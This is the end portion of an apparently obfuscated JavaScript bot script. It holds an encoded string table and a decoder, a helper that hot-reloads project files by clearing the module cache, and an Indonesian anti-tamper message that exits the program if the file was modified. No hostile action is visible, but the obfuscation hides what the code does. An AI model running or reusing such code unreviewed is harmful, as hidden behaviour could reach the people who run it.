3zMLLBG','zevlAeG','yxiGugvSyw5NzW','B053C0q','qLzbzM4','Dg9YBxq','As5ZAxb1DhP4lG','BMvRBW','s09ICuG','sunnwu8','A2P2zuS','z3jHA2S','EfbPEKu','EMzewuq','y29WEsz1Dg1FyW','CMXuC3i','v1v6vvq','vKPOB1G','idOGmtaWjqOkqG','CNvowNi','z3DLBI0Y','wu9Lvxm','8j+mSFcFPA0','B2zJya','q1viu2G','DxLfsg4','rwLisKu','sePtD2y','D3frAxa','DMDLBMPP','z1nRwNi','AMfZAgvY','yxbHpW','yNjHBMqTmW','rKDUrhO','tNvyCuy','Aw5Wt2W','yw4Gzgf0ywjHCW','BNvUDs05','Eg1SuuO','z3jHBMTRlti','ywXJywTLBNLH','D3vRB25Nltu','AhbKtwW','BhDdC3m','y29Tl3fPC3LHBG','v3jhsue','4PQG77IpieTHBxuGBwfZ','thbRBg0','yM90B2W','y3mVC2z3l3LLzq','ie1VBMv5','EMvICMe','ievyucdINkGkkZeW','CgvYzM9YBwfUyW','z3jHz2fZlta','tvbAEfG','yw5PDMLHltu','A2LWy0m','tNjpuKi','AYbesu5ptKflva','yxDtq0y','D1bxzuq','uxzxAg0','EvvuAei','BNDPzg93BwfRzq','te5MALq','D05vDMm','cJeUia','AhHRtLe','Dg9tDhjPBMC','zML6EI0Z','CMLYAq','CvbirMS','zgfYAxvZlte0','BMLRAxrH','Chv0CYbMyxiGyq','Bg9RAxiGA2fYzq','ihnRAwXSicO','CMfIyML0','Dw50DwSGBwvTyG','A2HHEML4ltm','zw1LCMn5','BhvSDs0W','BNvUDs0Xma','D0r5wMS','DKPdww4','A2HHEML4ltjG','z3Dpsuq','BMHHBNPV','qLD1vMO','whjwANq','z3vZAw9Ultm','Aw5VCMK','BMn5C0e','BgLVBMa','ALziyw4','EwfZDw8Toq','DwjHC3rPB24','se5IsfO','A2vUBMvUltC','zMfUyq','tM1SvLK','wfPQqLG','yK5XEe4','whDSt0C','uLDgt20','yMX1C2G','AMfYDMfUAxyTmW','tMXZr0q','y0riteK','D3nVBgrPzxi3nG','C2vWAgvYys01','vgvIywSGBg9NBW','8j+pMo+4JWRINPuGtwvUz2fU','DhvSzw4Toa','z3jLzw4TEwvSBa','v3LNwKy','yMCX','wgLIqxq','BwTUBeC','8j+tRsbuAwrHAYbHza','DwSGBwvUEwvYyq','t3nYCwi','BhjLyxbLCG','z3z3BKe','BMfSB2nOltC','ANvPy2u','wNzrAhO','y2fWAgvUEs0Z','BxL3wxm','q214EKe','zwfSDgG','ig5HBweGBMfIAq','y3mVC2z3l3DPBG','DwnnBei','DKfsqLG','CKLUvxa','BeTrvLC','CfbgCxy','ig5HBweUDw11CG','A2fZC2fKAw4Tma','Eunwveu','BgfZDg1VBNrOBa','BtGYyte','CMvUz2fYlta','AgvJyxjPBs00','BMfVA2fP','vKDlA0O','qvnPquq','rLv0vLu','EvDnqw4','DhvSzw4TnW','A2fSAxn0ys0Y','qMHJAvq','Eez2qvy','qvD6EKm','y3LHBI1ZCgfYAW','v2vuwwq','BMLUys0Y','2kFzHnMs2k3zJTMd2zdzITMf2y8','ywLYAs01','tLzoAwS','DxzHB3a','yNjPC3rSzwjHyW','CM1HDdOGl2rHzG','vM9NywW','DNf6wwe','DMfSAgvPBI02','yMfUBMvYB2zSBW','Dw5Yvhi','v0PgzhG','yMv0ig1VBMv5ia','ChvYCgXL','zwDLrxi','BNDPBNn0B24','q2PUsKq','u3rdz2K','zgXkv3m','rLvmuwG','u3vIDwG6ia','A2fPC2eTna','EhfYyLi','r0TTDwi','y2r1CgW','q1rwy3C','EurztwG','C2v0q2HHDfrPDa','C2T1za','vwfUzYbRyw11ia','qwH4sK8','ChjLBtO','DxjL','CungBhu','sLfQsK8','A3nVBwjYyq','BvzUALm','BhvJAwfUltu','t09rzKy','vMTyyMe','C29Uz290zw4','CLjcCvq','zeziBui','revmrvrfiokBLa','ANnVBJO','l2fWAs9JBgLLBG','EK5cwKW','tvjftKu','AMLUBMeTnq','ysWGBMLZy2f5yq','tMDruuG','EwvUys00','CMLJAhrLCI0Z','tLLzs1e','cKnOyw5UzwW6ia','BvLxAeC','C3vYywG','AhLHDfG','ywXPC3rHCG','C2fRDxjH','s2HxC0e','DMXHzgLTAxi','yw11ihb1BNLHoG','CgvUz2D1BMfHBG','BMr1CMLUzYbHBG','CeDRuNe','cLrVDgfSoIbsCa','yK9OAKC','tMLbAxC','A3PHCNLH','EMLNz3mTmG','DMLVBgv0mG','Bfb0t2C','4Q2q4Q2q4Q2q4Q2q4Q2q4Q2q','ue1OwhK','4P2mieTHBxuGyNvR','ig1PC2KGkG','swrNA3q','EMfUAxmToa','zMP6sfO','ELrlyxe','lwDVBgq','DffYy1a','AxqUcKnVBNrVAa','zejfsM4','yxqGBwvUyw1Iyq','CY9WAw50zxjLCW','tNf5zvO','Bgf0igrPicO','BvbiBeK','D29SzI1TzxrHBa','BwjHAgTHBIbWCG','DhjPBq','zg1QA1C','DsbIywXHCYbWzq','A29ZB25NlG','vgHLierLBgf5zq','vgvRtMS','CM94AwuTnq','zMfeyKy','y0jUshK','tMHrzgy','ALbzzxe','vuLszNO','DgLLDv9RAwv1','CM55t1y','uer0A1q','CMjHC3rPB24','A29NBwf3ltu','BgLVBNnUywTL','Bgnirem','vuzLAgy','AMf4ltK','z2XVDY1YywLUyG','BMf1DgLSDxmTma','zxvKB3jH','yurPyNv0DwHRyq','DwSGBwvSyw5QDq','AwjstM0','2iWG2yxzJTMg2ziG2kpzJTIT','B3nZuLq','ywKU','A2vSDwfYlG','A1H1suq','C2fSywGSignVyG','vLLmEei','A2f5BG','CwPkCNO','y3vKzgXL','rfHrs20','DuzHCeK','DwvUBxm','rxvAs0i','BLflEMG','yw5UAwuToa','EhPnq3q','yxj0AhvYDgvSyq','A2fSzw5N','yxzHDgfYBgvHzW','yxDuExO','DuLithm','EhDOq2G','CIbKAsbNyYbPBG','Bhv4lti','C0LbCLq','s1PQsee','EhbOyxjHAa','BMf4ltq','zeL1zgq','zNjLAw5OyxjKDa','v0Xdsvy','z3jLzw4TyMX1zq','zwXZDs00','ugvYBMfOig5VBa','cUkELsdWN5Qwie9YzgvY','z2PzyxC','8j+tRIblyw11ig1LBq','wvHMrum','BwvUEwvYywGUcG','u1Ltvhy','EKPezMm','ueTzBM4','EeDpqwS','BhjVywrOB2C','DMLVBgv0na','C29YywTHlteW','qKLYALO','qNPNufi','A2fOBgLP','B1fRwwq','qNPjv2G','CMvZB3vYy2vZ','zgnzCeS','tMD1CwW','r3vrr2W','swDQswu','yxjYyxK','CwHHBNPV','C2v0AMfZAgvYia','DMfYDxm','tufss0rpv04','CMPbrfi','t3jUv28','CM9JAW','ywSGChvUEweGyG','zLvxyxm','DwHHBNPV','AwnLBNqSihrOzq','8j+mLqOk8j+AGaRILPlILPlILOtILOtILOq','whnXrue','kMrPBwf0AwTHBG','u1P6wNK','zxjOAxr1BMDHBG','y21dBuW','CKX5EMm','BxjXvNe','A1fTuxO','Aw5Z','z3j1CcbKyw4GCW','DgHLierVBwLUyq','zhvRDw4','zhjVD3jHBMDLCG','AMf5y2uTna','CI0Z','2kFzHnMs2k3zJTMb2zdzITI42y8','rxv4zeC','Ee1juNe','C2HLBI0X','4P2mifrPzgfRigfK','Ae93Cfm','D2LZCc0Z','ysbHDhvYigzPDa','BMLZC2zVCNr1BG','zeLprLu','Bw90B3i','yxnOzs00','CMLJAhrLCG','ipcFJlmG8j+pMo+4JYaGicaGia','y1vMz3C','2kFzHnMs2yxzJTIQ2zdzITMg2y8','z25HyMXLlhrOzq','rgzLswG','yMXVB2rZzwvRzq','A3jPBgXPBMfUza','AgfUEweGC3rPAW','BJOkya','BgLJAZiG','sKPHBfO','B25GcUkaOIbGD2vS','y1PPyvC','CMfMywvS','D0D6y1q','A21LAq','Euferum','s2XzCK8','C3bHBv9NCM91Ca','veHvswG','z29YAwXSyq','zw56BY0Y','BM9TmIa','sxPhAMy','yvPft0C','s0vyrwG','zw56BW','DM9YAxnH','C2nHCG','EgDzuxG','BxfbrLu','y3jVC3nMAxjLyW','sM1kuhG','v3vZtgy','y292zxjVBMvWAq','BgLSAwfUys01','AujytNu','q3PMB1m','Agf5v0e','zfjwu08','CK9mBgC','icSXcUkELsdWN5oLifrV','sKnyBMe','C2fNAxjP','qvP2quy','4P2mieDHz2fS','C2vQDwfUAs0X','CMvWBhLxAxrOtq','t3rcCLC','BxfHveS','vNLRBM4','DgvYigLUAs4','y21RDg0','u0XdA2G','DMf5BMuTna','DMLVBgv0lty','tgvqthO','8j+uJsbnzw5JyxjPia','CgfUDgHLB24Tma','s0rXyMW','igHHC2LSigrHCG','y1zHrey','uMrmt2W','t3DbsMG','zxzLBhLUBI0Y','qxbXsMC','CwftuM4','qwjuCxK','AwDUAxmTmG','ywX2yxjV','BxjLAw5OyxjKDa','B3jPyw5Uyti','zM9YBwf0oGO','r3fnq0W','z0zTt3y','D2LJA2vY','ug9SAxnPlG','y2fRBg9UDg9UzW','ig1LBwj1A2eGAW','D2LZCc0Y','BKzjDwe','tKvsieHbtLLbia','A3zIueO','oYbMAtSGAwyGwW','4P2miefUDgKTBgLU','ywHHBNPV','yxbOzwXPB3m','yMTQrfO','BKjWreO','C3DAywu','C3jivMO','DxmGBwvUDw5NzW','2kFzJTMe2kFzJTIT2y7yR9Mp','r01yB3i','AxnOyxiTna','A0LOvvG','svH2Ewi','t1bxwwe','lMPZB24','EgLUEMHHBY01','CxHgsgu','AxjLBgLHlte','CMfUlMTLBwvUyq','wwjNwMm','rMHTt3e','zLLmug4','AMfYDMfUAxyTna','rgrpvM4','yNjHDw0TmW','q2TlBhO','Bhb6sLK','ig1HDsbKAsbQyq','A3nVv3u','l2fWAs9JB2DHBG','DgLKywTUEweGoa','BgvLC2LUltm','Ahr0CdOVl2fWAq','zLvjDuW','ig1HBNrHBIbWyq','C3DHDa','sLbisfi','DMnOAvq','tunMEeC','A2vSDwfYigrHCG','AxjLAw5OyxjKDa','ihvUDhvRig1LBG','kMHPBNqQigPPAW','yxr0CMLIDxrLCW','yMfSzhvTltm','BeXOtwG','vhn0rwq','Cgzxsxq','y292zxiTnW'];a0_0x3bd5=function(){return _0x11b047;};return a0_0x3bd5();}function pickRandom(_0x55bb67){const _0x2696a1=a0_0x459982,_0x29b8f0={'sqrel':function(_0x54c60b,_0x46997c){return _0x54c60b*_0x46997c;}};return _0x55bb67[Math[_0x2696a1(0xf02)](_0x29b8f0[_0x2696a1(0x2904)](Math[_0x2696a1(0x24f1)](),_0x55bb67[_0x2696a1(0x2b45)]))];}const chokidar=require(a0_0x459982(0x895));function nocache(_0x42d315,_0x248c50=()=>{}){const _0x4c3439=a0_0x459982,_0x118632={'DVVLe':function(_0xfc7c33,_0x4d4d94){return _0xfc7c33(_0x4d4d94);}};fs[_0x4c3439(0x45d)](require[_0x4c3439(0xf5a)](_0x42d315),async()=>{const _0x38a210=_0x4c3439;await _0x118632['DVVLe'](uncache,require['resolve'](_0x42d315)),_0x118632[_0x38a210(0x29aa)](_0x248c50,_0x42d315);});}function uncache(_0x212fe9){const _0x53f6a2=a0_0x459982,_0x4f3f94={'uMfwJ':function(_0x1d71d1,_0x284d9b){return _0x1d71d1(_0x284d9b);},'YJJDd':_0x53f6a2(0x2720)+_0x53f6a2(0x1934)+'.','dCSBX':function(_0x2f08a8,_0x2d105e){return _0x2f08a8!==_0x2d105e;},'PoLct':_0x53f6a2(0x1284),'vYnJV':function(_0x4a1821){return _0x4a1821();}};return new Promise((_0x45f89d,_0x4795cf)=>{const _0x28a015=_0x53f6a2;try{_0x4f3f94['dCSBX'](_0x4f3f94[_0x28a015(0x2e88)],'sgJpR')?(_0x4f50f5[_0x28a015(0x15e)](_0x5ee817),_0x4f3f94[_0x28a015(0xee3)](_0x170488,_0x4f3f94[_0x28a015(0xd91)])):(delete require[_0x28a015(0x1a15)][_0x212fe9],_0x4f3f94[_0x28a015(0xbd7)](_0x45f89d));}catch(_0x248625){_0x4f3f94[_0x28a015(0xee3)](_0x4795cf,_0x248625);}});}function a0_0x1014(_0x2dd943,_0x2934e2){const _0x3bd529=a0_0x3bd5();return a0_0x1014=function(_0x1014d8,_0x10607b){_0x1014d8=_0x1014d8-0xb6;let _0x4b4778=_0x3bd529[_0x1014d8];if(a0_0x1014['eSOfmU']===undefined){var _0x1ffbd3=function(_0xf04720){const _0x5c99b7='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x3b6fea='',_0x3363a8='';for(let _0x326794=0x0,_0x36bcc3,_0x4d7e76,_0x3d46f6=0x0;_0x4d7e76=_0xf04720['charAt'](_0x3d46f6++);~_0x4d7e76&&(_0x36bcc3=_0x326794%0x4?_0x36bcc3*0x40+_0x4d7e76:_0x4d7e76,_0x326794++%0x4)?_0x3b6fea+=String['fromCharCode'](0xff&_0x36bcc3>>(-0x2*_0x326794&0x6)):0x0){_0x4d7e76=_0x5c99b7['indexOf'](_0x4d7e76);}for(let _0x58b0fc=0x0,_0x3be2fe=_0x3b6fea['length'];_0x58b0fc<_0x3be2fe;_0x58b0fc++){_0x3363a8+='%'+('00'+_0x3b6fea['charCodeAt'](_0x58b0fc)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x3363a8);};a0_0x1014['bdkXLA']=_0x1ffbd3,_0x2dd943=arguments,a0_0x1014['eSOfmU']=!![];}const _0x20c6ba=_0x3bd529[0x0],_0x36ba27=_0x1014d8+_0x20c6ba,_0x2d0366=_0x2dd943[_0x36ba27];return!_0x2d0366?(_0x4b4778=a0_0x1014['bdkXLA'](_0x4b4778),_0x2dd943[_0x36ba27]=_0x4b4778):_0x4b4778=_0x2d0366,_0x4b4778;},a0_0x1014(_0x2dd943,_0x2934e2);}const filesToWatch=['./index.js',a0_0x459982(0x16ea)+'.js','./lib/myfu'+a0_0x459982(0x26d8),a0_0x459982(0x2456)];filesToWatch[a0_0x459982(0x25f5)](_0x1f683e=>{const _0x342b3c=a0_0x459982,_0x55e7cf={'HrJEB':function(_0x2ff2b3,_0x57e8f1,_0x16d583){return _0x2ff2b3(_0x57e8f1,_0x16d583);}};_0x55e7cf['HrJEB'](nocache,_0x1f683e,_0x4e6111=>console[_0x342b3c(0x1e13)](_0x342b3c(0x476)+_0x4e6111+(_0x342b3c(0x2c1a)+_0x342b3c(0x8b2))));});", "base64").toString());
  } catch (e) {
    console.error("❌ File rusak atau telah dimodifikasi secara tidak sah!");
    process.exit(1);
  }
})();